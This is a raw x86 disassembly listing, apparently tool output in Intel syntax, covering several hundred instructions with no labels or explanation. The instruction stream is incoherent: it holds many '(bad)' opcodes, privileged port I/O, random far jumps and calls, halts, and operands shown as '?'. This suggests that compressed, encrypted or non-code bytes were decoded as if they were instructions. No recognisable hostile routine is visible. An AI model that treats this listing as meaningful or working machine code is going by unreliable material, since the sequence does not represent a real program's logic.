  416fa7:	lahf   
  416fa8:	or     eax,0xf1734834
  416fad:	je     0x417016
  416faf:	push   ds
  416fb0:	das    
  416fb1:	jbe    0x416f52
  416fb3:	cli    
  416fb4:	xchg   BYTE PTR [ebx+0x31],bh
  416fb7:	sub    eax,0x876dcd2e
  416fbc:	push   esp
  416fbd:	mov    DWORD PTR [edi-0x3097d942],ecx
  416fc3:	jmp    0x25ca:0x2559462f
  416fca:	popf   
  416fcb:	mov    ebp,0xe622768c
  416fd0:	data16 aas 
  416fd2:	mov    edx,0xdd30523b
  416fd7:	out    dx,al
  416fd8:	inc    eax
  416fd9:	push   0x9310ab81
  416fde:	(bad)  
  416fdf:	mov    ?,WORD PTR [ecx]
  416fe1:	div    DWORD PTR [ecx+0x68b59122]
  416fe7:	pop    esp
  416fe8:	xor    BYTE PTR [ebp-0x36],ah
  416feb:	push   ecx
  416fec:	mov    ecx,0x60f58ec5
  416ff1:	cmp    BYTE PTR [esp+edx*1],ah
  416ff4:	pop    edi
  416ff5:	in     al,0x9d
  416ff7:	sahf   
  416ff8:	fnsave [esi-0x1d410097]
  416ffe:	mov    ah,0x8
  417000:	cmc    
  417001:	jge    0x416f86
  417003:	out    0x1d,al
  417005:	gs jmp 0x64ff:0x5d4b0b8a
  41700d:	je     0x416fdf
  41700f:	imul   edi,DWORD PTR ds:0x4ad539ee,0xfffffff8
  417016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417017:	popa   
  417018:	jl     0x417031
  41701a:	cmp    ecx,DWORD PTR ds:0x45cdf47c
  417020:	inc    ebx
  417021:	mov    esp,0x2550cec1
  417027:	mov    WORD PTR [esi-0x76],?
  41702a:	pop    ebp
  41702b:	out    dx,eax
  41702c:	lods   eax,DWORD PTR ds:[esi]
  41702d:	mov    WORD PTR [ebp+0x26203bf5],es
  417033:	pop    esi
  417034:	dec    esp
  417035:	repnz xchg esp,eax
  417037:	out    0x39,eax
  417039:	lods   al,BYTE PTR ds:[esi]
  41703a:	lea    edx,[ecx+eax*8+0x43]
  41703e:	xchg   edi,eax
  41703f:	aad    0x7b
  417041:	pop    esi
  417042:	fs sub al,0xde
  417045:	iret   
  417046:	mov    ah,0x73
  417048:	jg     0x416fd5
  41704a:	adc    al,0x7
  41704c:	fs iret 
  41704e:	xor    al,0xe4
  417050:	es adc bl,al
  417053:	dec    ebp
  417054:	call   0x9d6c:0xb746fe34
  41705b:	adc    bl,al
  41705d:	pop    edi
  41705e:	(bad)  
  417060:	mov    BYTE PTR [edi],ch
  417062:	and    edx,DWORD PTR [edx+eiz*2-0x184e21ee]
  417069:	push   ds
  41706a:	push   ecx
  41706b:	xchg   BYTE PTR [esi+0x75],cl
  41706e:	in     eax,dx
  41706f:	les    esi,FWORD PTR [esi+0x19efeb84]
  417075:	in     al,dx
  417076:	mov    dh,0x58
  417078:	xor    ah,BYTE PTR [esi]
  41707a:	fstp   st(0)
  41707c:	sbb    esi,edx
  41707e:	dec    eax
  41707f:	ins    BYTE PTR es:[edi],dx
  417080:	sub    esi,DWORD PTR [ebx-0x14]
  417083:	push   esi
  417084:	adc    BYTE PTR [eax],dh
  417086:	aad    0x7a
  417088:	into   
  417089:	sahf   
  41708a:	fsqrt  
  41708c:	lea    esp,[ebx]
  41708e:	ja     0x41704e
  417090:	movd   DWORD PTR [ebx+0x44],mm7
  417094:	aas    
  417095:	bound  eax,QWORD PTR [edi-0x59410e53]
  41709b:	mov    BYTE PTR [ebp+0x1a],bh
  41709e:	leave  
  41709f:	sbb    edi,DWORD PTR [edx-0xf]
  4170a2:	inc    ebx
  4170a3:	push   0xef8759a0
  4170a8:	pop    ecx
  4170a9:	sar    BYTE PTR [eax+0x33],0x78
  4170ad:	ffree  st(7)
  4170af:	cmp    al,0xe7
  4170b1:	aaa    
  4170b2:	je     0x4170f8
  4170b4:	sbb    ch,BYTE PTR ds:0xb7352768
  4170ba:	xchg   esi,eax
  4170bb:	rcl    edx,1
  4170bd:	cs es neg ch
  4170c1:	jb     0x4170f4
  4170c3:	add    DWORD PTR [eax+ebx*4-0x4e],0xfbe1004d
  4170cb:	push   edi
  4170cc:	sbb    al,0xb2
  4170ce:	mov    al,ds:0xee1469f7
  4170d3:	mov    ah,0xe6
  4170d5:	aam    0xba
  4170d7:	jnp    0x417103
  4170d9:	and    eax,0xe5b68c99
  4170de:	pop    ds
  4170df:	(bad)  
  4170e0:	(bad)  
  4170e2:	jmp    DWORD PTR [esi-0x3f]
  4170e5:	xlat   BYTE PTR ds:[ebx]
  4170e6:	(bad)  
  4170e7:	cmp    BYTE PTR [eax],al
  4170e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170ea:	je     0x417137
  4170ec:	retf   0x1a43
  4170ef:	scas   eax,DWORD PTR es:[edi]
  4170f0:	loop   0x41713a
  4170f2:	aad    0x9
  4170f4:	sbb    eax,DWORD PTR [eax+0x2e]
  4170f7:	shl    ebx,cl
  4170f9:	int3   
  4170fa:	xchg   edx,eax
  4170fb:	mov    edx,0x7d340975
  417100:	mov    eax,0xd9301a9
  417105:	repz adc BYTE PTR [edi+0x62],ah
  417109:	mov    bl,0x65
  41710b:	fmul   DWORD PTR [edx]
  41710d:	and    ah,BYTE PTR [edi]
  41710f:	xor    ah,BYTE PTR [esi-0x2a0d9681]
  417115:	sbb    DWORD PTR [esp+ecx*4-0xbbef1b1],0x7a
  41711d:	pushf  
  41711e:	add    al,0xda
  417120:	or     al,0xad
  417122:	ret    
  417123:	adc    al,0x2b
  417125:	packuswb mm2,QWORD PTR [esi]
  417128:	ins    DWORD PTR es:[edi],dx
  417129:	ss xchg edx,eax
  41712b:	sub    DWORD PTR [esi+ebx*4-0x71],eax
  41712f:	push   esp
  417130:	sbb    ebp,DWORD PTR [esi-0x7c]
  417133:	(bad)  
  417134:	or     esi,edi
  417136:	loopne 0x417113
  417138:	and    BYTE PTR [ebx+0x700d5c98],bh
  41713e:	pushf  
  41713f:	mov    DWORD PTR [edi],0xad7b2827
  417145:	ss (bad) 
  417147:	scas   al,BYTE PTR es:[edi]
  417148:	shr    BYTE PTR [eax],cl
  41714a:	xor    al,0x3f
  41714c:	mov    ss,eax
  41714e:	xlat   BYTE PTR ds:[ebx]
  41714f:	mov    ch,BYTE PTR [ecx-0x632869a1]
  417155:	xchg   edx,eax
  417156:	jnp    0x41711b
  417158:	mov    esp,0x7c193dd8
  41715d:	xor    eax,0xf709a661
  417162:	or     ebx,DWORD PTR [edx-0x479fc3ff]
  417168:	xchg   ecx,eax
  417169:	mov    al,ds:0x97dae08e
  41716e:	rcl    BYTE PTR ds:[ecx-0x198c9db1],0x70
  417176:	mov    dl,0x11
  417178:	pop    ebp
  417179:	data16 test ah,bh
  41717c:	rcl    BYTE PTR [edx],cl
  41717e:	aam    0x69
  417180:	nop
  417181:	inc    esp
  417182:	in     al,dx
  417183:	xchg   esi,eax
  417184:	sahf   
  417185:	push   esi
  417186:	scas   al,BYTE PTR es:[edi]
  417187:	or     al,0xa1
  417189:	push   ss
  41718a:	loopne 0x41712c
  41718c:	xor    bh,al
  41718e:	adc    ebp,DWORD PTR cs:0x4fd9c82c
  417195:	and    esp,edi
  417197:	jge    0x417155
  417199:	test   DWORD PTR [ecx],0xa4d55481
  41719f:	xchg   edx,eax
  4171a0:	cmp    ebp,edi
  4171a2:	xchg   ebx,eax
  4171a3:	jnp    0x4171fb
  4171a5:	xlat   BYTE PTR ds:[ebx]
  4171a6:	ficomp DWORD PTR [edi]
  4171a8:	arpl   WORD PTR [ecx-0x15],bx
  4171ab:	pop    es
  4171ac:	cmc    
  4171ad:	out    0x33,eax
  4171af:	call   0xd95f590c
  4171b4:	xchg   dh,ch
  4171b6:	mov    esi,ebp
  4171b8:	leave  
  4171b9:	lock stos BYTE PTR es:[edi],al
  4171bb:	call   0x6b64b423
  4171c0:	inc    esp
  4171c1:	fldenv [ebx]
  4171c3:	mov    eax,ds:0x1dd5bd29
  4171c8:	sar    DWORD PTR [ecx],0x18
  4171cb:	xor    al,0x4f
  4171cd:	(bad)  
  4171ce:	mov    ds:0x7f726173,al
  4171d3:	add    cl,bh
  4171d5:	and    al,BYTE PTR [edx+ebx*8]
  4171d8:	dec    esp
  4171d9:	call   0x17accdd7
  4171de:	iret   
  4171df:	popa   
  4171e0:	or     ah,dl
  4171e2:	daa    
  4171e3:	dec    esp
  4171e4:	shl    DWORD PTR [ecx-0x7ebe03d8],cl
  4171ea:	jns    0x41718b
  4171ec:	scas   eax,DWORD PTR es:[edi]
  4171ed:	leave  
  4171ee:	lds    ebx,FWORD PTR [eax+0xc]
  4171f1:	out    dx,al
  4171f2:	jge    0x4171f3
  4171f4:	sbb    eax,0x831a927
  4171f9:	fs loope 0x4171ed
  4171fc:	les    eax,FWORD PTR [edi+0x301f7a5e]
  417202:	(bad)  
  417204:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417205:	test   eax,0x35c54783
  41720a:	psubd  mm0,QWORD PTR [edi]
  41720d:	icebp  
  41720e:	add    bl,ah
  417210:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417211:	dec    esp
  417212:	test   eax,0x451034ad
  417217:	aam    0x1d
  417219:	pop    esi
  41721a:	xchg   ebp,eax
  41721b:	xchg   edi,eax
  41721c:	inc    dl
  41721e:	mov    edx,0x62570cf7
  417223:	call   0xcb55:0x30f7db3c
  41722a:	sub    ebx,DWORD PTR [ecx]
  41722c:	and    BYTE PTR [ebp-0x771d0b39],ah
  417232:	cmc    
  417233:	jb     0x4172a6
  417235:	cld    
  417236:	jle    0x4171e9
  417238:	dec    eax
  417239:	adc    BYTE PTR [edi],dh
  41723b:	cs sahf 
  41723d:	dec    edx
  41723e:	inc    ebx
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	adc    ah,0x17
  417257:	adc    esi,DWORD PTR [eax+0x26]
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0xe870707e
  417261:	imul   ebp,DWORD PTR [ebx-0x3fecba13],0xe3330f8f
  41726b:	popf   
  41726c:	aaa    
  41726d:	push   es
  41726e:	jne    0x417242
  417270:	les    esi,FWORD PTR [edi+0x7566b1b7]
  417276:	in     al,dx
  417277:	imul   esp,DWORD PTR [edx+0x380b14ef],0xe56ad446
  417281:	pop    ds
  417282:	mov    ds:0x7f93e935,eax
  417287:	test   DWORD PTR [esi],eax
  417289:	push   ebp
  41728a:	mov    dl,0x15
  41728c:	ret    
  41728d:	and    ebp,esi
  41728f:	in     eax,dx
  417290:	loopne 0x4172ee
  417292:	add    DWORD PTR [ebx-0x301afd10],ebp
  417298:	dec    esp
  417299:	test   eax,0xae6f11ea
  41729e:	dec    edx
  41729f:	arpl   WORD PTR [eax],si
  4172a1:	xchg   ebx,eax
  4172a2:	cmp    dl,BYTE PTR [ecx+edi*8+0xb]
  4172a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172a7:	(bad)  
  4172a9:	das    
  4172aa:	adc    DWORD PTR [eax+0x37],ebp
  4172ad:	mov    cl,0x6a
  4172af:	add    BYTE PTR [edx-0x4449e4f1],ch
  4172b5:	xor    BYTE PTR [ecx-0x56],dl
  4172b8:	fstp   TBYTE PTR [esi-0x73215368]
  4172be:	inc    ecx
  4172bf:	push   0xffffff8a
  4172c1:	sub    BYTE PTR [ecx+ecx*1+0x4e],dl
  4172c5:	gs pop ebx
  4172c7:	ret    
  4172c8:	cs xchg esp,eax
  4172ca:	mov    dh,0xb
  4172cc:	and    bl,dl
  4172ce:	pop    esp
  4172cf:	xor    eax,0xc230699
  4172d4:	in     al,0xf3
  4172d6:	adc    DWORD PTR [edx+0x202d4a5c],esi
  4172dc:	stc    
  4172dd:	cmp    DWORD PTR [eax+0x5f],ecx
  4172e0:	jmp    0x4172e9
  4172e2:	xchg   esi,eax
  4172e3:	xor    ah,BYTE PTR [bx+si-0x6e01]
  4172e8:	loope  0x4172ad
  4172ea:	sub    ebx,DWORD PTR [ebp+0xa]
  4172ed:	mov    eax,ds:0x4c3a3bc4
  4172f2:	(bad)  
  4172f4:	ss mov ebx,0x574b02df
  4172fa:	inc    ebx
  4172fb:	inc    ecx
  4172fc:	das    
  4172fd:	jne    0x4172f4
  4172ff:	into   
  417300:	fisttp WORD PTR [ebp+0x49]
  417303:	mov    sp,0xb2ba
  417307:	mov    cl,0x91
  417309:	out    dx,al
  41730a:	ficomp DWORD PTR [eax-0x19]
  41730d:	stos   DWORD PTR es:[edi],eax
  41730e:	shl    DWORD PTR [esi+eax*8+0x3a],1
  417312:	sub    BYTE PTR [esi],ch
  417314:	outs   dx,DWORD PTR ds:[esi]
  417315:	scas   eax,DWORD PTR es:[edi]
  417316:	lahf   
  417317:	and    BYTE PTR [esi-0x6e],cl
  41731a:	in     eax,dx
  41731b:	sub    al,0x55
  41731d:	fld    DWORD PTR [ebp+0x54]
  417320:	xor    al,BYTE PTR [edi]
  417322:	outs   dx,DWORD PTR ds:[esi]
  417323:	pop    ebp
  417324:	mov    edx,esi
  417326:	add    eax,0x4d18d1f0
  41732b:	hlt    
  41732c:	out    0x65,al
  41732e:	scas   eax,DWORD PTR es:[edi]
  41732f:	test   BYTE PTR [ebx-0x33],al
  417332:	jns    0x41738f
  417334:	adc    eax,0xb444c770
  417339:	sub    DWORD PTR [ecx+ecx*2-0x7199c745],edx
  417340:	(bad)  
  417341:	jl     0x417381
  417343:	mov    esi,0x34838ae8
  417348:	push   cs
  417349:	sub    DWORD PTR [eax-0x5fd55987],ebx
  41734f:	xchg   ebp,eax
  417350:	iret   
  417351:	mov    esi,0x5fac2753
  417356:	mov    ds:0x768d8b8,al
  41735b:	loop   0x41739b
  41735d:	retf   
  41735e:	js     0x41735f
  417360:	pop    ebp
  417361:	pop    edi
  417362:	and    eax,0x3a686b38
  417367:	xor    BYTE PTR [edi-0x3dbd89bd],al
  41736d:	addr16 test dh,dh
  417370:	icebp  
  417371:	adc    eax,0xcfe769dc
  417376:	pop    esp
  417377:	test   DWORD PTR ds:0x82b58e11,ebp
  41737d:	lahf   
  41737e:	nop
  41737f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417380:	es clc 
  417382:	sub    bl,ch
  417384:	jge    0x4173d6
  417386:	retf   0xf1bc
  417389:	fsubr  DWORD PTR [eax+edi*2+0x79d508ea]
  417390:	and    BYTE PTR [ebx-0x44],bl
  417393:	push   esi
  417394:	mov    cl,0xdd
  417396:	bound  esp,QWORD PTR [ebx-0x1f]
  417399:	xor    DWORD PTR [edx-0x1dcb344],ebx
  41739f:	add    BYTE PTR [esi],bh
  4173a1:	jmp    0x4173fb
  4173a3:	inc    ebx
  4173a4:	sub    esi,DWORD PTR [edx-0x34b85d81]
  4173aa:	std    
  4173ab:	sar    DWORD PTR [esi-0xc],1
  4173ae:	mov    edx,0xe1c6ce3
  4173b3:	cmp    BYTE PTR [edx],0x72
  4173b6:	jecxz  0x4173ac
  4173b8:	mov    esp,0xfc1d6c47
  4173bd:	cmp    al,0x23
  4173bf:	jno    0x41739f
  4173c1:	pop    es
  4173c2:	lods   eax,DWORD PTR cs:[esi]
  4173c4:	adc    BYTE PTR [edi+edx*1],al
  4173c7:	arpl   bx,bp
  4173c9:	xor    BYTE PTR [esi],ah
  4173cb:	sahf   
  4173cc:	ds psllq mm6,mm1
  4173d0:	or     BYTE PTR [esi+0x853c689],0x1c
  4173d7:	jnp    0x417433
  4173d9:	addr16 inc esp
  4173db:	fmul   st(2),st
  4173dd:	rcl    DWORD PTR [ecx-0xce980e2],cl
  4173e3:	outs   dx,DWORD PTR ds:[esi]
  4173e4:	fild   QWORD PTR [edx+0xf]
  4173e7:	mov    esp,0x99779b74
  4173ec:	cmp    ah,ch
  4173ee:	push   es
  4173ef:	xchg   esp,eax
  4173f0:	add    ebx,DWORD PTR [ebx+0x49b91198]
  4173f6:	rcr    DWORD PTR [ebx],cl
  4173f8:	and    al,0x4
  4173fa:	arpl   dx,dx
  4173fc:	add    dl,BYTE PTR [esi]
  4173fe:	xchg   DWORD PTR [esi-0x11],ecx
  417401:	sub    DWORD PTR [bx+si-0x2d57],ebp
  417406:	push   ds
  417407:	mov    edx,0x328503bd
  41740c:	gs test eax,0x7884dfd0
  417412:	lods   al,BYTE PTR ds:[esi]
  417413:	cmp    esp,esi
  417415:	repz out dx,al
  417417:	aaa    
  417418:	dec    eax
  417419:	dec    ebx
  41741a:	jecxz  0x41739c
  41741c:	dec    esi
  41741d:	es xchg esp,eax
  41741f:	xor    esi,DWORD PTR [ebx+0x3e]
  417422:	das    
  417423:	push   ebp
  417424:	dec    edx
  417425:	(bad)  
  417426:	jge    0x4173ef
  417428:	das    
  417429:	mov    gs,WORD PTR [edx]
  41742b:	out    dx,eax
  41742c:	(bad)  
  41742d:	aam    0x48
  41742f:	std    
  417430:	inc    ecx
  417431:	fnstcw WORD PTR [eax]
  417433:	inc    ecx
  417434:	push   0x10
  417436:	mov    eax,ds:0x348f780c
  41743b:	xchg   ebp,eax
  41743c:	pop    edi
  41743d:	daa    
  41743e:	push   0x8ffb0191
  417443:	int    0x53
  417445:	aam    0x2e
  417447:	outs   dx,DWORD PTR ds:[esi]
  417448:	fimul  WORD PTR [ebx-0x397672ed]
  41744e:	adc    al,0x3a
  417450:	ins    BYTE PTR es:[edi],dx
  417451:	xor    al,0x94
  417453:	fstp   QWORD PTR ds:0x485f1ef3
  417459:	fsubr  QWORD PTR [edi]
  41745b:	rcl    DWORD PTR [eax],1
  41745d:	push   esp
  41745e:	mov    ah,0xd2
  417460:	pop    ss
  417461:	lock adc eax,0xe4a84204
  417467:	sahf   
  417468:	cmp    DWORD PTR [ecx],edi
  41746a:	int3   
  41746b:	xchg   DWORD PTR [ebp-0x18],esp
  41746e:	inc    ecx
  41746f:	mov    ch,0x50
  417471:	fnsave [ebp+0x253bb8bb]
  417477:	clc    
  417478:	out    dx,al
  417479:	push   cs
  41747a:	pop    esi
  41747b:	mov    ebp,0x11a8449f
  417480:	dec    edx
  417481:	es pop eax
  417483:	mov    eax,0x3938585b
  417488:	or     ebp,DWORD PTR [edi+0x63]
  41748b:	xor    DWORD PTR [eax],0xffffffac
  41748e:	fsub   DWORD PTR [edx-0x7c]
  417491:	pop    esp
  417492:	jge    0x417489
  417494:	push   edx
  417495:	and    ecx,DWORD PTR [esi+ecx*1+0x7014cfca]
  41749c:	addr16 mov ds:0xa007,al
  4174a0:	mov    dh,BYTE PTR [ebp+eax*2+0x26]
  4174a4:	outs   dx,BYTE PTR ds:[esi]
  4174a5:	mov    edx,0x87bd912b
  4174aa:	sbb    DWORD PTR [ebx+0x7b67116b],edi
  4174b0:	ins    BYTE PTR es:[edi],dx
  4174b1:	test   BYTE PTR [edx],al
  4174b3:	loop   0x417439
  4174b5:	lahf   
  4174b6:	push   ebp
  4174b7:	das    
  4174b8:	or     eax,0x61a72cfc
  4174bd:	pop    ebp
  4174be:	sti    
  4174bf:	add    al,dl
  4174c1:	cmp    DWORD PTR [edx],esi
  4174c3:	mov    bl,0x82
  4174c5:	xor    eax,0xfa9cc4c4
  4174ca:	ret    
  4174cb:	stos   DWORD PTR es:[edi],eax
  4174cc:	push   edi
  4174cd:	xor    al,0xa8
  4174cf:	aam    0xcb
  4174d1:	mov    ch,0x6
  4174d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174d4:	shr    BYTE PTR [eax],cl
  4174d6:	add    dh,bl
  4174d8:	icebp  
  4174d9:	aas    
  4174da:	push   ebp
  4174db:	into   
  4174dc:	cs jecxz 0x4174c4
  4174df:	dec    ecx
  4174e0:	adc    DWORD PTR [eax-0x44],0x5c9456c1
  4174e7:	mov    bl,bl
  4174e9:	iret   
  4174ea:	sbb    eax,0xa38fa134
  4174ef:	in     al,0xef
  4174f1:	pop    edx
  4174f2:	pop    es
  4174f3:	xchg   ecx,eax
  4174f4:	inc    eax
  4174f5:	inc    edi
  4174f6:	inc    ebp
  4174f7:	mov    esp,0x7e7a47ee
  4174fc:	into   
  4174fd:	sbb    dl,BYTE PTR [esi]
  4174ff:	xchg   ebx,eax
  417500:	mov    eax,0xbea84504
  417505:	add    ecx,DWORD PTR ds:0xf8a86203
  41750b:	dec    edi
  41750c:	mov    bh,0xa0
  41750e:	(bad)  
  41750f:	sbb    dl,BYTE PTR [ebx+0x1ac52830]
  417515:	xlat   BYTE PTR ds:[ebx]
  417516:	sbb    BYTE PTR [ecx],bh
  417518:	pop    edi
  417519:	xchg   esi,eax
  41751a:	mov    DWORD PTR [edi+0x13],esi
  41751d:	jmp    0x566b4821
  417522:	fmul   st(4),st
  417524:	out    0x7d,al
  417526:	jno    0x41755b
  417528:	rol    BYTE PTR [ecx],cl
  41752a:	pop    ebp
  41752b:	hlt    
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [ecx],ecx
  417543:	pop    DWORD PTR [ecx-0x49]
  417546:	mov    ecx,0xb9707f24
  41754b:	jle    0x4175bd
  41754d:	jo     0x4174d2
  41754f:	add    eax,0x54c38d35
  417554:	jmp    0xc617:0x99c6b21d
  41755b:	xor    eax,0x5ac8c2d8
  417560:	imul   ebx,DWORD PTR [ebp+0x4a],0xfffffff6
  417564:	das    
  417565:	ja     0x417523
  417567:	retf   0x9d6a
  41756a:	cmp    al,0xf4
  41756c:	pop    esp
  41756d:	xchg   edi,eax
  41756e:	arpl   WORD PTR [edx-0x58c55bdd],bx
  417574:	mov    edx,0x7141c7b3
  417579:	mov    ah,0x40
  41757b:	and    DWORD PTR [ecx],eax
  41757d:	inc    edx
  41757e:	push   eax
  41757f:	xor    al,0xa1
  417581:	loope  0x4175c8
  417583:	dec    ebx
  417584:	mov    ah,ch
  417586:	aam    0x92
  417588:	rcl    BYTE PTR [ebx-0x68721768],cl
  41758e:	xor    BYTE PTR [edi+edx*1+0x312b5fbd],bl
  417595:	leave  
  417596:	adc    edx,ebx
  417598:	or     DWORD PTR [edi],eax
  41759a:	xchg   ebx,eax
  41759b:	push   ss
  41759c:	ja     0x41754b
  41759e:	call   0x162e:0x9589ad9d
  4175a5:	shr    DWORD PTR [ecx-0x29],cl
  4175a8:	dec    ecx
  4175a9:	jl     0x4175b9
  4175ab:	push   edi
  4175ac:	sti    
  4175ad:	in     al,0x72
  4175af:	mov    ds:0x6e308770,al
  4175b4:	(bad)  
  4175b6:	add    ebp,edx
  4175b8:	or     al,0xbd
  4175ba:	(bad)  
  4175bb:	gs movs BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4175be:	mov    ebx,0x4bcffe03
  4175c3:	(bad)
  4175c7:	xor    eax,0xe9b2846b
  4175cc:	int    0x32
  4175ce:	retf   0xf996
  4175d1:	ins    BYTE PTR es:[edi],dx
  4175d2:	mov    ebp,DWORD PTR [ebp-0x4]
  4175d5:	or     edx,esi
  4175d7:	cmp    DWORD PTR [ebx+eiz*8+0x4960e429],edi
  4175de:	mov    ah,0x2b
  4175e0:	jae    0x4175af
  4175e2:	lea    eax,[ecx+0x74]
  4175e5:	or     DWORD PTR [edx-0x57cdf590],edi
  4175eb:	cvtdq2ps xmm4,xmm1
  4175ee:	(bad)  [ebx+0x57]
  4175f1:	xor    BYTE PTR [ebx],dl
  4175f3:	adc    ecx,DWORD PTR [ebx+ebp*4]
  4175f6:	sub    eax,0x9e8649fc
  4175fb:	mov    WORD PTR [ebx],ss
  4175fd:	jb     0x4175c0
  4175ff:	or     eax,0x534105d7
  417604:	pop    ebx
  417605:	mov    edi,0x2a9dee24
  41760a:	xchg   edi,eax
  41760b:	cld    
  41760c:	ja     0x417601
  41760e:	rcr    DWORD PTR [ebx+edi*2-0x30],cl
  417612:	cmp    bl,BYTE PTR [eax]
  417614:	ins    BYTE PTR es:[edi],dx
  417615:	dec    eax
  417616:	repnz sub eax,0xb07fde38
  41761c:	mov    eax,ds:0x3ba48894
  417621:	out    dx,al
  417622:	jmp    0x9e2e:0xa4476447
  417629:	test   DWORD PTR [ebx+0x4023b5c3],esi
  41762f:	xor    dh,0x0
  417632:	cld    
  417633:	(bad)
  417636:	sub    DWORD PTR [ecx+edx*4],0xffffff8c
  41763a:	cmp    BYTE PTR [ecx+ecx*2-0x42],0x63
  41763f:	test   BYTE PTR [edx+0x7980e2],bh
  417645:	repz xchg ecx,eax
  417647:	cdq    
  417648:	pop    ebp
  417649:	loope  0x41762e
  41764b:	mov    edi,0x6f03c841
  417650:	sub    al,0xa8
  417652:	pop    es
  417653:	mov    WORD PTR [edi+ebp*2+0x4d5df97c],es
  41765a:	ds pop ecx
  41765c:	push   ebx
  41765d:	cmp    eax,0xd605fdf5
  417662:	cmp    eax,0x86a2a623
  417667:	repnz xchg ebp,eax
  417669:	push   ebx
  41766a:	js     0x41769c
  41766c:	mov    al,ds:0xa48045cb
  417671:	mov    edx,0x298ec31a
  417676:	or     DWORD PTR [ebx+0x6d],0x5b
  41767a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41767b:	push   0x98d42d
  417680:	(bad)  
  417681:	stos   BYTE PTR es:[edi],al
  417682:	inc    esi
  417683:	sub    DWORD PTR [ebp-0x6c],ecx
  417686:	mov    dh,0x98
  417688:	cld    
  417689:	pop    esp
  41768a:	pop    edi
  41768b:	inc    edi
  41768c:	out    0xdb,al
  41768e:	dec    esp
  41768f:	and    DWORD PTR [ecx-0x47],eax
  417692:	arpl   WORD PTR [edx-0x66c69119],dx
  417698:	scas   eax,DWORD PTR es:[edi]
  417699:	cdq    
  41769a:	inc    ecx
  41769b:	outs   dx,BYTE PTR ds:[esi]
  41769c:	aam    0x8f
  41769e:	mov    ah,0x65
  4176a0:	pop    es
  4176a1:	outs   dx,DWORD PTR ds:[esi]
  4176a2:	leave  
  4176a3:	iret   
  4176a4:	mov    al,0x7
  4176a6:	sbb    eax,0x778ed6bc
  4176ab:	pop    ss
  4176ac:	jl     0x417637
  4176ae:	mov    al,ds:0x18344818
  4176b3:	enter  0x692c,0x6f
  4176b7:	pop    esi
  4176b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176b9:	ret    0x420d
  4176bc:	or     al,0xc3
  4176be:	jge    0x4176de
  4176c0:	add    al,0xef
  4176c2:	cmp    ebp,edi
  4176c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176c5:	test   esi,ecx
  4176c7:	js     0x4176f9
  4176c9:	mov    cl,0x1e
  4176cb:	pop    ds
  4176cc:	out    0xf1,eax
  4176ce:	cmp    edx,DWORD PTR [edx-0x2e]
  4176d1:	and    al,0x6f
  4176d3:	std    
  4176d4:	fld    DWORD PTR [ecx-0x5d]
  4176d7:	xchg   esp,eax
  4176d8:	lahf   
  4176d9:	popf   
  4176da:	sub    DWORD PTR [edx+0x27],esi
  4176dd:	cmp    ah,dh
  4176df:	popf   
  4176e0:	or     al,0x1f
  4176e2:	fst    st(0)
  4176e4:	or     bl,al
  4176e6:	loop   0x4176ff
  4176e8:	ret    0xa7cd
  4176eb:	div    BYTE PTR [ebp-0x263945a7]
  4176f1:	repnz int3 
  4176f3:	or     eax,0xf8bc0cfa
  4176f8:	aas    
  4176f9:	xor    dh,ah
  4176fb:	add    eax,0xbe4aa9ae
  417700:	shl    BYTE PTR [eax-0x29],cl
  417703:	outs   dx,DWORD PTR ds:[esi]
  417704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417705:	inc    eax
  417706:	leave  
  417707:	ins    DWORD PTR es:[edi],dx
  417708:	(bad)  
  41770a:	push   ds
  41770b:	test   al,0xd3
  41770d:	adc    BYTE PTR [edx+eiz*8],dl
  417710:	mov    al,ds:0x6a1934e4
  417715:	push   ss
  417716:	out    dx,al
  417717:	adc    ecx,DWORD PTR [ebx-0x36fa7b1e]
  41771d:	push   ecx
  41771e:	sbb    DWORD PTR ds:0x16a134f1,ebx
  417724:	shr    BYTE PTR [edx],cl
  417726:	and    DWORD PTR [ebp+0x7ae46d85],0x665c7fc
  417730:	inc    DWORD PTR [eax+0x66]
  417733:	add    eax,0xf5ae21ab
  417738:	js     0x417792
  41773a:	push   0x4
  41773c:	nop
  41773d:	xor    eax,0xb211536b
  417742:	xchg   edi,eax
  417743:	leave  
  417744:	jmp    0x3850175e
  417749:	stos   DWORD PTR es:[edi],eax
  41774a:	mov    ecx,0x8308b2d0
  41774f:	adc    BYTE PTR [ebx+0x5000bc1a],0xc6
  417756:	test   cl,0xa1
  417759:	mov    bh,BYTE PTR ss:[ecx]
  41775c:	pop    ebp
  41775d:	fisubr DWORD PTR [esi+0x50]
  417760:	cs xchg esp,eax
  417762:	iret   
  417763:	and    al,0xe1
  417765:	imul   ecx,DWORD PTR [ebx+0x658e8dd9],0x145495ea
  41776f:	inc    ebp
  417770:	cli    
  417771:	mov    cl,bl
  417773:	test   BYTE PTR [edx-0x9],al
  417776:	jl     0x4177b2
  417778:	out    dx,eax
  417779:	sbb    BYTE PTR [esi*8-0x3e43bb08],bl
  417780:	jmp    0x417721
  417782:	adc    al,BYTE PTR [ebp+0x6e7b6090]
  417788:	push   esi
  417789:	arpl   si,dx
  41778b:	add    BYTE PTR [ebp+0x10],0x42
  41778f:	jecxz  0x4177cd
